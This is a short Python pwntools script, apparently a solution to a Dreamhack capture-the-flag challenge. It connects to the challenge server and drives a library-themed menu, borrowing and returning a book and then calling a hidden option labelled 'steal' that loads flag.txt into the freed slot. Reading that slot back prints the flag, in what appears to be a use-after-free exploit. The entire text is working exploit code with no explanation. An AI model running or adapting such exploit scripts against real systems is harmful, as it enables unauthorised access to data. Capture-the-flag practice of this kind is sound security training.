from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23025
r = remote(HOST, PORT)

def borrow(book_idx):
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', str(book_idx).encode())

def read(book_idx):
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', str(book_idx).encode())

def ret():
    r.sendlineafter(b': ', b'3')

def steal(file, size):
    r.sendlineafter(b': ', b'275')
    r.sendlineafter(b': ', file.encode())
    r.sendlineafter(b': ', str(size).encode())

borrow(1)
ret()
read(0)
steal('flag.txt', 0x100)
read(0)

r.interactive()